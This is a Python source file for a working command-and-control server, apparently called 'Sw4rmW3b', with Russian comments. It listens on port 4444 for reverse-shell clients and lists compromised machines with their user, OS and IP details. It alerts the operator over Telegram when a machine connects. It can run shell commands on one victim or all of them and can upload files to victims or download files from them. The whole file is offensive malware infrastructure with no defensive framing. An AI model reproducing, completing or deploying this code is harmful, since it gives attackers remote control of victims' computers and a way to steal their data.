import cmd
import threading
import socket
import json
import struct
import time
import os
import sys
import io
import locale
import platform
import requests
import threading
import readline
from colorama import init, Fore, Style
import telebot

cli_lock = threading.Lock()  # блокировка для вывода из разных потоков

def print_cli(msg):
    """Безопасно выводит уведомление в CLI, не ломая текущую команду"""
    with cli_lock:
        try:
            # Текущая строка ввода
            current_input = readline.get_line_buffer()
            # Стираем её
            sys.stdout.write(f"\r{' ' * (len(Sw4rmCLI.prompt) + len(current_input))}\r")
            # Выводим сообщение
            print(msg)
            # Восстанавливаем строку ввода
            sys.stdout.write(f"{Sw4rmCLI.prompt}{current_input}")
            sys.stdout.flush()
        except Exception:
            # fallback, если readline нет
            print(msg)

# Перекодируем stdout и stderr в UTF-8, чтобы кириллица с клиента отображалась корректно
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

init(autoreset=True)

# Telegram Bot settings
TG_BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
TG_CHAT_ID = "ВАШ_ТГ_ID"
bot = telebot.TeleBot(TG_BOT_TOKEN)

clients = {}  # {client_name: {"socket": sock, "addr": addr, "info": info, "cwd":"/"}}
selected_client = None
selected_name = None
selected_cwd = "/"

def send_data(sock, data):
    data_bytes = data.encode("utf-8") if isinstance(data, str) else data
    sock.send(struct.pack('>I', len(data_bytes)))
    sock.sendall(data_bytes)

def recv_data(sock):
    sock.settimeout(None)  # отключаем таймаут
    raw_len = sock.recv(4)
    if not raw_len:
        return None
    length = struct.unpack('>I', raw_len)[0]
    data = b''
    while len(data) < length:
        packet = sock.recv(length - len(data))
        if not packet:
            return None
        data += packet
    return data

def get_public_ip():
    """Определение публичного IP сервера через ipify"""
    try:
        return requests.get("https://api.ipify.org").text
    except Exception:
        return "Unknown"

def send_telegram_html(msg):
    """Отправка уведомления через telebot с HTML разметкой"""
    try:
        bot.send_message(TG_CHAT_ID, msg, parse_mode="HTML")
    except Exception as e:
        print(f"[TG ERROR] {e}")

def safe_send_command(client_name, cmd):
    if client_name not in clients:
        return "[ERROR] Клиент отключен"
    sock = clients[client_name]["socket"]
    try:
        send_data(sock, cmd)
        result = recv_data(sock)
        if result is None:
            return "[ERROR] Нет ответа от клиента"

        try:
            return result.decode("utf-8")
        except UnicodeDecodeError:
            try:
                return result.decode("cp866")
            except UnicodeDecodeError:
                return result.decode("cp1251", errors="replace")

    except (BrokenPipeError, ConnectionResetError):
        clients.pop(client_name, None)
        global selected_client, selected_name
        if selected_name == client_name:
            selected_client = None
            selected_name = None
        print_cli(f"[DISCONNECTED] {client_name}")  # <-- уведомление через CLI
        return "[ERROR] Соединение потеряно"
        
class Sw4rmCLI(cmd.Cmd):
    intro = Fore.CYAN + "\nSw4rmW3b C2 CLI by 4RUMZ Team.\nВведите help для списка команд." + Style.RESET_ALL
    prompt = Fore.GREEN + "Sw4rm> " + Style.RESET_ALL

    def preloop(self):
        self.update_prompt()

    def update_prompt(self):
        global selected_name, selected_cwd
        if selected_name:
            self.prompt = f"{Fore.YELLOW}{selected_name}:{Fore.BLUE}{selected_cwd}{Fore.GREEN}> {Style.RESET_ALL}"
        else:
            self.prompt = f"{Fore.GREEN}Sw4rm> {Style.RESET_ALL}"

    def do_list(self, arg):
        if not clients:
            print("Список клиентов пуст")
            return
        header = f"{'ID':20} {'User':15} {'OS':20} {'Local IP':15} {'Public IP':15}"
        print(header)
        print("-"*len(header))
        for name, data in clients.items():
            info = data["info"]
            pub_ip = data.get("public_ip", "Unknown")
            line = f"{name:20} {info.get('user','')[:15]:15} {info.get('os','')[:20]:20} {info.get('ip','')[:15]:15} {pub_ip:15}"
            if name == selected_name:
                line = Fore.GREEN + "> " + line + Style.RESET_ALL
            print(line)

    def do_connect(self, arg):
        global selected_client, selected_name, selected_cwd
        name = arg.strip()
        if name in clients:
            selected_client = clients[name]["socket"]
            selected_name = name
            selected_cwd = clients[name].get("cwd", "/")
            print(f"[CONNECTED] {name}")
            self.update_prompt()
        else:
            print("Клиент не найден")

    def do_disconnect(self, arg):
        global selected_client, selected_name, selected_cwd
        if selected_name:
            print(f"[DISCONNECTED] {selected_name}")
            selected_client = None
            selected_name = None
            selected_cwd = "/"
            self.update_prompt()
        else:
            print("Нет выбранного клиента")

    def do_all(self, arg):
        command = arg.strip()
        if not command:
            print("Использование: all <command>")
            return
        for name in list(clients.keys()):
            res = safe_send_command(name, command)
            print(Fore.CYAN + f"[{name}] {res}" + Style.RESET_ALL)

    def do_cd(self, arg):
        global selected_client, selected_name, selected_cwd
        if not selected_client:
            print("Сначала выберите клиента через connect <ID>")
            return
        path = arg.strip()
        cmd_to_send = f"cd {path}"
        result = safe_send_command(selected_name, cmd_to_send)
        if "Changed directory" in result or path in ["/", "~"]:
            selected_cwd = path if path != "~" else "/home"
            clients[selected_name]["cwd"] = selected_cwd
            self.update_prompt()
        print(result)

    def do_upload(self, arg):
        global selected_client, selected_name
        if not selected_client:
            print("Сначала выберите клиента через connect <ID>")
            return
        parts = arg.strip().split()
        if len(parts) != 2:
            print("Использование: upload <локальный файл> <удалённый файл>")
            return
        local_file, remote_file = parts
        if not os.path.exists(local_file):
            print(f"Файл {local_file} не найден.")
            return
        try:
            send_data(selected_client, f"__upload__ {remote_file}")
            time.sleep(0.1)
            with open(local_file, "rb") as f:
                send_data(selected_client, f.read())
            result = recv_data(selected_client)
            print(result.decode() if result else "Нет ответа от клиента")
        except (BrokenPipeError, ConnectionResetError):
            print("Соединение с клиентом потеряно.")
            selected_client = None
            selected_name = None
            self.update_prompt()

    def do_download(self, arg):
        global selected_client, selected_name
        if not selected_client:
            print("Сначала выберите клиента через connect <ID>")
            return
        remote_file = arg.strip()
        if not remote_file:
            print("Использование: download <удалённый файл>")
            return
        send_data(selected_client, f"download {remote_file}")
        data = recv_data(selected_client)
        if data:
            with open(remote_file, "wb") as f:
                f.write(data)
            print(f"Файл {remote_file} сохранён на сервере.")
        else:
            print("[ERROR] Не удалось скачать файл")

    def do_info(self, arg):
        ascii_logo = r"""
 $$$$$$\                $$\   $$\                         $$\      $$\  $$$$$$\  $$\       
$$  __$$\               $$ |  $$ |                        $$ | $\  $$ |$$ ___$$\ $$ |      
$$ /  \__|$$\  $$\  $$\ $$ |  $$ | $$$$$$\  $$$$$$\$$$$\  $$ |$$$\ $$ |\_/   $$ |$$$$$$$\  
\$$$$$$\  $$ | $$ | $$ |$$$$$$$$ |$$  __$$\ $$  _$$  _$$\ $$ $$ $$\$$ |  $$$$$ / $$  __$$\ 
 \____$$\ $$ | $$ | $$ |\_____$$ |$$ |  \__|$$ / $$ / $$ |$$$$  _$$$$ |  \___$$\ $$ |  $$ |
$$\   $$ |$$ | $$ | $$ |      $$ |$$ |      $$ | $$ | $$ |$$$  / \$$$ |$$\   $$ |$$ |  $$ |
\$$$$$$  |\$$$$$\$$$$  |      $$ |$$ |      $$ | $$ | $$ |$$  /   \$$ |\$$$$$$  |$$$$$$$  |
 \______/  \_____\____/       \__|\__|      \__| \__| \__|\__/     \__| \______/ \_______/ 
        """
        contacts = "Контакты: telegram: @c5807, email: c5807@fuck102.ru"
        version = "Версия: 1.0"
        description = "Sw4rmW3b — тестовая система reverse-shell управления клиентами."
        print(Fore.CYAN + ascii_logo + Style.RESET_ALL)
        print(Fore.YELLOW + contacts + Style.RESET_ALL)
        print(Fore.MAGENTA + version + Style.RESET_ALL)
        print(Fore.GREEN + description + Style.RESET_ALL)

    def default(self, line):
        global selected_client, selected_name
        if not selected_client:
            print("Сначала выберите клиента через connect <ID>")
            return
        result = safe_send_command(selected_name, line)
        print(result)

def handle_client(conn, addr):
    name = None
    try:
        info_raw = recv_data(conn)
        info = json.loads(info_raw.decode("utf-8"))
        name = info.get("name", addr[0])
        public_ip = addr[0]

        if name in clients:  # закрываем старый сокет
            try: clients[name]["socket"].close()
            except: pass
            clients.pop(name)

        clients[name] = {"socket": conn, "addr": addr, "info": info, "cwd": "/", "public_ip": public_ip}
        print_cli(f"[CONNECTED] {name} ({addr[0]})")  # <-- через print_cli

        # Telegram уведомление
        tg_msg = f"<b>Новый клиент подключился:</b>\n"
        tg_msg += f"ID: <code>{name}</code>\nUser: <code>{info.get('user','')}</code>\n"
        tg_msg += f"OS: <code>{info.get('os','')}</code>\nLocal IP: <code>{info.get('ip','')}</code>\n"
        tg_msg += f"Public IP: <code>{public_ip}</code>"
        send_telegram_html(tg_msg)

        while True:
            time.sleep(1)  # держим соединение живым

    except Exception as e:
        print_cli(f"[ERROR] {e}")
    finally:
        conn.close()
        if name in clients:
            clients.pop(name)
            print_cli(f"[DISCONNECTED] {name}")

def client_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # важно для перезапуска
    server.bind(("0.0.0.0", 4444))
    server.listen()
    print("[LISTENING] Сервер на 0.0.0.0:4444")
    while True:
        try:
            conn, addr = server.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
        except Exception as e:
            print(f"[ERROR] При подключении клиента: {e}")

if __name__ == "__main__":
    threading.Thread(target=client_listener, daemon=True).start()
    Sw4rmCLI().cmdloop()
